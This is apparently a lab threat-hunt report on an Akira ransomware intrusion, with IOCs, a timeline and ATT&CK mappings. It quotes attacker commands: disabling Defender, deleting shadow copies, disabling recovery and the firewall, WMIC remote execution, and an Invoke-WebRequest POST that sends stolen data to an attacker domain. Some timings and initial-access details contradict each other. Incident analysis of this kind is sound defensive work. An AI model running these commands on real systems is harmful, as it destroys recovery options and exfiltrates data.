# Threat Hunt: THE BUYER

## Executive Summary

This document summarizes the complete threat hunting investigation conducted on behalf of an unnamed organization following a ransomware attack by the **Akira** ransomware group. The attacker gained initial access via a malicious PDF dropper (`daniel_richardson_cv.pdf.exe`), established persistent remote access using AnyDesk, deployed a custom C2 beacon (`wsync.exe`), performed credential theft targeting LSASS, moved laterally via WMI remote execution with stolen Administrator credentials, exfiltrated sensitive data using a custom staging tool (`st.exe`), and ultimately deployed ransomware (`updater.exe`) disguised as a legitimate Windows updater process.

The investigation covered **40 flags** across **11 attack sections**, spanning activity from **January 15 to January 27, 2026**. Two hosts were confirmed compromised (`as-pc2`, `as-srv`), one user account was hijacked (`david.mitchell`), and shared drives containing sensitive organizational data were fully encrypted with the `.akira` extension.

---

## Threat Actor Profile

| Attribute | Detail |
|---|---|
| **Threat Actor** | Akira Ransomware Group |
| **Operation Type** | Ransomware-as-a-Service (RaaS) |
| **Attack Model** | Double Extortion (Encryption + Data Leak) |
| **Encryption** | AES-256 |
| **File Extension** | `.akira` |
| **TOR Portal** | `akira12iz6a7qgd3ayp316yub7xx2uep76idk3u2ko11pj5z3z636bad.onion` |
| **Victim ID** | `813R-QWJM-XKIJ` |
| **Attacker External IP** | `88.97.164.155` |
| **Ransom Note** | `akira_readme.txt` |

---

## Investigation Overview

### Section 1 — Ransom Note Analysis

**Target Systems:** `as-pc2`, `as-srv`

**Summary:** Analysis of the Akira ransom note dropped after encryption. Identified the threat actor group, TOR negotiation portal, victim ID, and encrypted file extension.

| Metric | Value |
|---|---|
| **Flags Investigated** | Q1 – Q4 |
| **Ransomware Group** | Akira |
| **Encrypted Extension** | `.akira` |
| **TOR Contact** | `.onion` negotiation portal |
| **Victim ID** | `813R-QWJM-XKIJ` |

**Key Findings:**
- Akira ransom note (`akira_readme.txt`) dropped across multiple directories after encryption
- Victim assigned unique negotiation ID `813R-QWJM-XKIJ` for TOR portal contact
- Files encrypted with AES-256 and `.akira` extension appended
- Ransom note claims exfiltration of financial records, employee PII, client databases, contracts, internal communications, and proprietary business data

---

### Section 2 — Infrastructure

**Target Systems:** `as-pc1`, `as-pc2`, `as-srv`

**Summary:** Identification of attacker-controlled infrastructure including payload hosting domains, C2 IPs, and AnyDesk relay nodes used throughout the attack.

| Metric | Value |
|---|---|
| **Flags Investigated** | Q5 – Q8 |
| **Payload Domain** | `sync.cloud-endpoint.net` |
| **Ransomware Staging Domain** | `cdn.cloud-endpoint.net` |
| **C2 IP Addresses** | `104.21.30.237`, `172.67.174.46` |
| **AnyDesk Relay** | `relay-0b975d23.net.anydesk.com` |

**Key Findings:**
- Attacker operated two domains: `sync.cloud-endpoint.net` (tool hosting) and `cdn.cloud-endpoint.net` (C2/staging)
- C2 domain resolved to Cloudflare IPs, masking true attacker infrastructure
- AnyDesk relay traffic observed on `as-srv` via `relay-0b975d23.net.anydesk.com`
- Initial dropper `daniel_richardson_cv.pdf.exe` beaconed to `cdn.cloud-endpoint.net` after execution

---

### Section 3 — Defense Evasion

**Target System:** `as-pc2`

**Summary:** The attacker actively disabled Windows Defender and security controls via a malicious batch script before proceeding with credential theft and ransomware deployment.

| Metric | Value |
|---|---|
| **Flags Investigated** | Q9 – Q12 |
| **Evasion Script** | `kill.bat` |
| **Script Hash (SHA256)** | `0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c` |
| **Registry Key Tampered** | `DisableAntiSpyware` |
| **Timestamp** | `2026-01-27T21:03:42Z` |

**Key Findings:**
- `kill.bat` executed from `C:\ProgramData\` via `cmd.exe /c "C:\ProgramData\kill.bat"`
- Set `DisableAntiSpyware = 1` under `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`
- Set `DisableRealtimeMonitoring = 1` under `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection`
- Registry modification confirmed via `DeviceRegistryEvents` at 21:03 UTC

---

### Section 4 — Credential Access

**Target System:** `as-pc2`

**Summary:** The attacker enumerated running processes to locate `lsass.exe` and accessed its named pipe to perform credential theft, yielding Administrator credentials used for lateral movement.

| Metric | Value |
|---|---|
| **Flags Investigated** | Q13 – Q14 |
| **Process Enumeration Command** | `tasklist \| findstr lsass` |
| **Named Pipe Accessed** | `\Device\NamedPipe\lsass` |
| **Timestamp** | `2026-01-27T20:18:31Z` |

**Key Findings:**
- `wsync.exe` executed `tasklist | findstr lsass` on `as-pc2` at 21:11 UTC to identify `lsass.exe` PID
- Named pipe `\Device\NamedPipe\lsass` accessed directly, consistent with credential dumping tooling
- Stolen credentials (including `as.srv.administrator`) subsequently used for WMI lateral movement to `as-srv`

---

### Section 5 — Initial Access

**Target System:** `as-pc2`

**Summary:** Attacker regained access to the environment using a pre-staged AnyDesk instance from a prior compromise ("The Broker"), connecting directly to `as-pc2` from external IP `88.97.164.155`.

| Metric | Value |
|---|---|
| **Flags Investigated** | Q15 – Q18 |
| **Remote Access Tool** | AnyDesk |
| **Execution Path** | `C:\Users\Public\AnyDesk.exe` |
| **Attacker External IP** | `88.97.164.155` |
| **Compromised User** | `david.mitchell` |

**Key Findings:**
- AnyDesk deployed to `C:\Users\Public\` — a world-writable, non-standard installation directory
- Attacker IP `88.97.164.155` made direct peer-to-peer AnyDesk connections over port 7070 (bypassing relay)
- `david.mitchell` account compromised and used throughout the attack
- AnyDesk was pre-staged during a prior attack phase ("The Broker"), enabling re-entry without re-exploitation

---

### Section 6 — Command & Control

**Target System:** `as-pc2`

**Summary:** After the original beacon (`RuntimeBroker.exe`) failed to maintain stable communications, the attacker deployed a new C2 beacon (`wsync.exe`) which served as the primary command execution engine for all subsequent attacker activity.

| Metric | Value |
|---|---|
| **Flags Investigated** | Q19 – Q22 |
| **New Beacon** | `wsync.exe` |
| **Beacon Location** | `C:\ProgramData\` |
| **First Execution** | `2026-01-27T20:44:32Z` |
| **Original Beacon Hash** | `66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b` |
| **Replacement Beacon Hash** | `0072ca0d0adc9a1b2e1625db4409f57fc32b5a09c414786bf08c4d8e6a073654` |

**Key Findings:**
- `wsync.exe` named to mimic a legitimate Windows sync service
- Deployed to `C:\ProgramData\` — no admin rights required to write
- `wsync.exe` spawned all subsequent attacker commands: shadow copy deletion, firewall disabling, process enumeration, credential theft
- Two distinct versions deployed (original replaced after instability)
- Beacon activity captured in `DeviceEvents` (`ActionType == "PowerShellCommand"`) — not visible in `DeviceProcessEvents` alone

---

### Section 7 — Discovery

**Target Systems:** `as-pc2`, `as-srv`

**Summary:** The attacker performed active network discovery using Advanced IP Scanner and a custom `scan.exe` tool, then enumerated network shares on internal hosts to identify ransomware targets.

| Metric | Value |
|---|---|
| **Flags Investigated** | Q23 – Q26 |
| **Scanner Tool** | `scan.exe` |
| **Scanner Hash** | `26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b` |
| **Internal IPs Enumerated** | `10.1.0.183`, `10.1.0.154` |
| **Share Discovery Command** | `net.exe view \\<IP>` |

**Key Findings:**
- `scan.exe` executed on `as-pc2` at 20:17 UTC under `david.mitchell`
- Advanced IP Scanner (`advanced_ip_scanner.exe`) run in portable mode from `david.mitchell`'s Downloads folder
- `net view` enumeration of two internal IPs from `as-srv` at 22:17 UTC identified shared folders
- Targeted shares: Backups, Clients, Compliance, Contractors, Payroll

---

### Section 8 — Lateral Movement

**Target System:** `as-srv`

**Summary:** Using Administrator credentials obtained via LSASS dumping, the attacker moved laterally from `as-pc2` to `as-srv` using WMI remote execution, enabling deployment of ransomware and staging tools on the server.

| Metric | Value |
|---|---|
| **Flags Investigated** | Q27 |
| **Lateral Movement Method** | WMI (`WMIC.exe /node:`) |
| **Account Used** | `as.srv.administrator` |
| **Target Host** | `as-srv` (`10.1.0.203`) |

**Key Findings:**
- `WMIC.exe /node:10.1.0.203 /user:Administrator /password:******* process call create` used to remotely execute commands
- Lateral movement chain observed: `as-pc1 → as-pc2 → as-srv`
- WMI used to remotely download and execute payloads via `certutil` on target systems
- `RuntimeBroker.exe` and `AnyDesk.exe` delivered to remote hosts through this method

---

### Section 9 — Tool Transfer

**Target System:** `as-pc2`

**Summary:** The attacker used two download methods to transfer tools into the environment — `bitsadmin.exe` was attempted first but failed due to a malformed command, then `Invoke-WebRequest` was used successfully as a fallback.

| Metric | Value |
|---|---|
| **Flags Investigated** | Q28 – Q29 |
| **First Method (Failed)** | `bitsadmin.exe` |
| **Fallback Method** | `Invoke-WebRequest` |
| **Tools Downloaded** | `scan.exe`, `wsync.exe` |
| **Source Domain** | `sync.cloud-endpoint.net` |

**Key Findings:**
- `bitsadmin /transfer job1` command observed between 20:14–20:50 UTC; malformed output path caused failure
- `Invoke-WebRequest -Uri https://sync.cloud-endpoint.net/... -OutFile ...` used successfully at 20:17 UTC
- PowerShell cmdlet activity captured in `DeviceEvents` (`ActionType == "PowerShellCommand"`) rather than `DeviceProcessEvents`
- Same cmdlet later used for data exfiltration via HTTP POST to attacker server

---

### Section 10 — Exfiltration

**Target System:** `as-srv`

**Summary:** The attacker used a custom staging tool (`st.exe`) to compress sensitive data into a ZIP archive, then exfiltrated it to their server via an HTTP POST request using `Invoke-WebRequest`.

| Metric | Value |
|---|---|
| **Flags Investigated** | Q30 – Q32 |
| **Staging Tool** | `st.exe` |
| **Staging Tool Hash** | `512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015` |
| **Archive Created** | `exfil_data.zip` |
| **Archive Location** | `C:\Users\Public\exfil_data.zip` |
| **Exfiltration Method** | `Invoke-WebRequest -Method POST` |
| **Destination** | `https://sync.cloud-endpoint.net/` |
| **Timestamp** | `2026-01-27T22:24:09Z` |

**Key Findings:**
- `st.exe` (custom tool in `C:\ProgramData\`) compressed stolen data into `exfil_data.zip` on `as-srv`
- Archive staged to `C:\Users\Public\` before exfiltration
- Data exfiltrated via `Invoke-WebRequest -Method POST -InFile exfil_data.zip` to attacker's payload domain
- Same PowerShell cmdlet used for both tool downloads and data upload

---

### Section 11 — Ransomware Deployment

**Target Systems:** `as-pc2`, `as-srv`

**Summary:** In the final phase, the attacker deployed `updater.exe` (Akira ransomware) disguised as a Windows updater, deleted all Volume Shadow Copies to prevent recovery, encrypted files across shared drives, dropped ransom notes, then deleted the ransomware binary using a cleanup script.

| Metric | Value |
|---|---|
| **Flags Investigated** | Q33 – Q40 |
| **Ransomware Binary** | `updater.exe` |
| **Ransomware Hash** | `e609d070ee9f76934d73353be4ef7ff34b3ecc3a2d1e5d052140ed4cb9e4752b` |
| **Staged By** | `powershell.exe` |
| **Encryption Start** | `2026-01-27T22:18:33Z` |
| **Recovery Prevention** | `wmic shadowcopy delete` |
| **Ransom Note** | `akira_readme.txt` (dropped by `updater.exe`) |
| **Cleanup Script** | `clean.bat` |
| **Hosts Compromised** | `as-pc2`, `as-srv` |

**Key Findings:**
- `updater.exe` named to masquerade as a legitimate Windows process (defense evasion via masquerading)
- `wsync.exe` executed full recovery-prevention suite before ransomware deployment:
  - `wmic shadowcopy delete`
  - `vssadmin delete shadows /all /quiet`
  - `bcdedit /set {default} recoveryenabled No`
  - `netsh advfirewall set allprofiles state off`
  - `sc stop VSS` / `sc stop wbengine`
- `akira_readme.txt` dropped by `updater.exe` at 22:18 UTC across multiple directories
- `clean.bat` deleted `updater.exe` post-encryption — anti-forensics measure to remove binary evidence

---

## Complete Attack Path

```
                        AKIRA Attack Flow — The Buyer
                        ==============================

  [INTERNET]                                            [TOR NETWORK]
      │                                                       │
      │  AnyDesk Direct Connection                            │
      │  88.97.164.155 → Port 7070                           │
      ▼                                                       │
┌──────────────────┐   WMI + Stolen Creds  ┌──────────────────┐
│    as-pc2        │─────────────────────▶ │    as-srv        │
│  (Beachhead)     │                       │  (File Server)   │
│                  │                       │                  │
│  • Jan 15        │                       │  • Jan 27        │
│  • AnyDesk RAT   │                       │  • updater.exe   │
│  • wsync.exe C2  │                       │  • st.exe exfil  │
│  • kill.bat      │                       │  • exfil_data    │
│  • LSASS dump    │                       │  • .akira enc.   │
└──────────────────┘                       └──────────────────┘
        │                                          │
        │  C2 Beacon                               │ HTTP POST
        ▼                                          ▼
┌──────────────────────────────────────────────────────────┐
│           cdn/sync.cloud-endpoint.net                    │
│        (Attacker C2 + Payload Hosting + Exfil)           │
└──────────────────────────────────────────────────────────┘

Attack Timeline:
────────────────────────────────────────────────────────────
Jan 15  │ as-pc1 → WMI → as-pc2: AnyDesk downloaded via certutil
        │ AnyDesk executed from C:\Users\Public\ on as-pc2
        │ WMI pivot: as-pc2 → as-srv (10.1.0.203), RuntimeBroker.exe dropped
────────────────────────────────────────────────────────────
Jan 27  │ 20:14  bitsadmin download attempts begin (failed — malformed path)
        │ 20:17  scan.exe executed — network discovery begins
        │ 20:18  \Device\NamedPipe\lsass accessed — credential theft
        │ 20:22  Invoke-WebRequest downloads wsync.exe + scan.exe
        │ 20:44  wsync.exe first executed — C2 beacon active
        │ 21:03  Registry modified — Windows Defender disabled
        │ 21:06  kill.bat — real-time protection disabled
        │ 21:09  Shadow copies deleted, firewall off, recovery disabled
        │ 21:11  tasklist | findstr lsass executed
        │ 22:08  AnyDesk relay on as-srv observed
        │ 22:17  net view — internal share enumeration (10.1.0.183, 10.1.0.154)
        │ 22:18  updater.exe deployed — encryption begins, ransom note dropped
        │ 22:24  exfil_data.zip created by st.exe, exfiltrated via HTTP POST
        │ 22:xx  clean.bat — updater.exe deleted (anti-forensics)
────────────────────────────────────────────────────────────
```

---

## MITRE ATT&CK Techniques

| Technique ID | Name | Section |
|---|---|---|
| T1566.001 | Phishing: Spearphishing Attachment | Initial Access |
| T1204.002 | User Execution: Malicious File | Initial Access |
| T1219 | Remote Access Software (AnyDesk) | Initial Access, Persistence |
| T1078 | Valid Accounts | Initial Access, Lateral Movement |
| T1078.002 | Valid Accounts: Domain Accounts | Lateral Movement |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Tool Transfer, Exfiltration |
| T1047 | Windows Management Instrumentation | Lateral Movement |
| T1562.001 | Impair Defenses: Disable or Modify Tools | Defense Evasion |
| T1112 | Modify Registry | Defense Evasion |
| T1036.005 | Masquerading: Match Legitimate Name or Location | Defense Evasion |
| T1070.004 | Indicator Removal: File Deletion | Defense Evasion |
| T1057 | Process Discovery | Discovery |
| T1046 | Network Service Discovery | Discovery |
| T1135 | Network Share Discovery | Discovery |
| T1003.001 | OS Credential Dumping: LSASS Memory | Credential Access |
| T1105 | Ingress Tool Transfer | Tool Transfer |
| T1197 | BITS Jobs | Tool Transfer |
| T1071.001 | Application Layer Protocol: Web Protocols | C2 |
| T1090.002 | Proxy: External Proxy | C2 |
| T1560.001 | Archive Collected Data: Archive via Utility | Exfiltration |
| T1048 | Exfiltration Over Alternative Protocol | Exfiltration |
| T1490 | Inhibit System Recovery | Impact |
| T1486 | Data Encrypted for Impact | Impact |

---

## IOC Summary

### Network Indicators

| Type | Value |
|---|---|
| **Payload Domain** | `sync.cloud-endpoint.net` |
| **C2/Staging Domain** | `cdn.cloud-endpoint.net` |
| **C2 IP** | `104.21.30.237` |
| **C2 IP** | `172.67.174.46` |
| **Attacker External IP** | `88.97.164.155` |
| **AnyDesk Relay** | `relay-0b975d23.net.anydesk.com` |
| **TOR Portal** | `akira12iz6a7qgd3ayp316yub7xx2uep76idk3u2ko11pj5z3z636bad.onion` |

### File Indicators

| Filename | SHA256 | Role |
|---|---|---|
| `updater.exe` | `e609d070ee9f76934d73353be4ef7ff34b3ecc3a2d1e5d052140ed4cb9e4752b` | Akira ransomware binary |
| `wsync.exe` (v1) | `66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b` | C2 beacon (original) |
| `wsync.exe` (v2) | `0072ca0d0adc9a1b2e1625db4409f57fc32b5a09c414786bf08c4d8e6a073654` | C2 beacon (replacement) |
| `kill.bat` | `0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c` | Defense evasion script |
| `st.exe` | `512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015` | Data staging/compression tool |
| `scan.exe` | `26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b` | Custom network scanner |

### Host Indicators

| Type | Value |
|---|---|
| **Compromised Hosts** | `as-pc2`, `as-srv` |
| **Compromised User** | `david.mitchell` |
| **Lateral Movement Account** | `as.srv.administrator` |
| **Staging Directories** | `C:\Users\Public\`, `C:\ProgramData\` |
| **Encrypted Extension** | `.akira` |
| **Ransom Note** | `akira_readme.txt` |
| **Victim ID** | `813R-QWJM-XKIJ` |

---

## Recovery Assessment

| Recovery Method | Status | Reason |
|---|---|---|
| **Volume Shadow Copies** | Destroyed | `wmic shadowcopy delete` + `vssadmin delete shadows /all /quiet` |
| **Windows Recovery** | Disabled | `bcdedit /set {default} recoveryenabled No` |
| **VSS Service** | Stopped | `sc stop VSS` |
| **Windows Backup Engine** | Stopped | `sc stop wbengine` |
| **Windows Firewall** | Disabled | `netsh advfirewall set allprofiles state off` |
| **Ransomware Binary** | Deleted | `clean.bat` removed `updater.exe` post-encryption |

---

## Investigation Statistics

| Metric | Value |
|---|---|
| **Total Flags Investigated** | 40 |
| **Attack Sections** | 11 |
| **Attacker Dwell Time** | 12 days (Jan 15 – Jan 27, 2026) |
| **Systems Compromised** | 2 (`as-pc2`, `as-srv`) |
| **Accounts Compromised** | 2 (`david.mitchell`, `as.srv.administrator`) |
| **Ransomware Group** | Akira |
| **Encrypted Extension** | `.akira` |
| **MITRE Techniques Identified** | 23 |
| **Custom Attacker Tools** | 3 (`wsync.exe`, `st.exe`, `scan.exe`) |
| **Attacker External IP** | `88.97.164.155` |

---

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Microsoft Defender for Endpoint Documentation](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/)
- [Akira Ransomware — CISA Advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a)
- [No More Ransom Project](https://www.nomoreransom.org/)
- [FBI IC3 Reporting](https://www.ic3.gov/)
- [CISA Ransomware Guide](https://www.cisa.gov/stopransomware)

---

## Document Information

| Field | Value |
|---|---|
| **Classification** | CONFIDENTIAL |
| **Created** | May 2026 |
| **Author** | Maurice |
| **Version** | 1.0 |
| **Status** | Complete |
